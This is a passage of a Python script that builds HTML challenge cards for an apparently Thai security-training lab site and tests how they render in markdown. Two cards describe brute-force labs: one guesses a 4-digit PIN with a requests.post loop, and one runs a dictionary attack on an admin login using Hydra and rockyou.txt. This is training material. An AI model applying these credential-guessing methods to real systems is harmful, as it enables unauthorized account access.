card_28 = """<div style="background:#070a13;border:1px solid rgba(56,189,248,0.3);border-radius:12px;padding:22px;margin:2rem auto 0.5rem;max-width:100%;box-shadow:0 8px 24px rgba(56,189,248,0.12);position:relative;overflow:hidden;box-sizing:border-box;">
  <div style="position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#38bdf8,#0284c7);"></div>
  <div style="display:flex;align-items:flex-start;gap:14px;flex-wrap:wrap;">
    <span style="font-size:1.5rem;">🔐</span>
    <div style="flex:1;">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:1rem;font-weight:800;color:#ffffff;">Lab BRUTE-1: PIN Lock Brute Force (0000–9999)</span>
        <span style="background:rgba(56,189,248,0.2);border:1px solid rgba(56,189,248,0.4);border-radius:16px;padding:2px 10px;font-size:0.73rem;color:#7dd3fc;">⭐⭐ Easy</span>
      </div>
      <div style="font-size:0.75rem;color:rgba(255,255,255,0.35);font-family:monospace;margin-bottom:8px;">High-Speed Automation — Simple Brute Force</div>
      <p style="font-size:0.87rem;color:#94a3b8;line-height:1.65;margin:0;">ระบบ Vault ป้องกันด้วย PIN 4 หลักแต่ไม่มี Rate Limiting เขียนสคริปต์ Python ใช้ <code style='color:#38bdf8;'>requests.post(url, data={{"pin": pin_str}})</code> เพื่อลอง 0000–9999 จนได้ Flag</p>
    </div>
  </div>
</div>"""

# Lab BRUTE-2 (Challenge 29)
card_29 = """<div style="background:#070a13;border:1px solid rgba(239,68,68,0.3);border-radius:12px;padding:22px;margin:2rem auto 0.5rem;max-width:100%;box-shadow:0 8px 24px rgba(239,68,68,0.12);position:relative;overflow:hidden;box-sizing:border-box;">
  <div style="position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#ef4444,#dc2626);"></div>
  <div style="display:flex;align-items:flex-start;gap:14px;flex-wrap:wrap;">
    <span style="font-size:1.5rem;">🔑</span>
    <div style="flex:1;">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:1rem;font-weight:800;color:#ffffff;">Lab BRUTE-2: Dictionary Attack (Admin Login Form)</span>
        <span style="background:rgba(239,68,68,0.2);border:1px solid rgba(239,68,68,0.4);border-radius:16px;padding:2px 10px;font-size:0.73rem;color:#fca5a5;">⭐⭐⭐ Medium</span>
      </div>
      <div style="font-size:0.75rem;color:rgba(255,255,255,0.35);font-family:monospace;margin-bottom:8px;">Dictionary Spraying — Hydra / Python Wordlist Attack</div>
      <p style="font-size:0.87rem;color:#94a3b8;line-height:1.65;margin:0;">Admin Login Form ไม่มี Rate Limiting โดย username คือ <code style='color:#ef4444;'>admin</code> ให้ใช้ Hydra หรือ Python ร่วมกับ Wordlist (<code style='color:#ef4444;'>rockyou.txt</code>) ยิงทดสอบจนกว่าจะล็อกอินสำเร็จ</p>
    </div>
  </div>
</div>"""

# Test rendering of all cards and sections
sections = [
    ("LFI Masterclass", clean_lfi),
    ("XSS Masterclass", clean_xss),
    ("Brute Masterclass", clean_brute),
    ("Card 30", card_30),
    ("Card 31", card_31),
    ("Card 25", card_25),
    ("Card 26", card_26),
    ("Card 27", card_27),
    ("Card 28", card_28),
    ("Card 29", card_29)
]

for name, html in sections:
    r = markdown(html)
    p_bug = '<p>' in r
    div_bug = '&lt;div' in r
    print(f"{name:18}: length={len(r):5}, any <p>={p_bug!s:5}, any &lt;div={div_bug!s:5}")

print("\nAll sections successfully parsed and verified!")
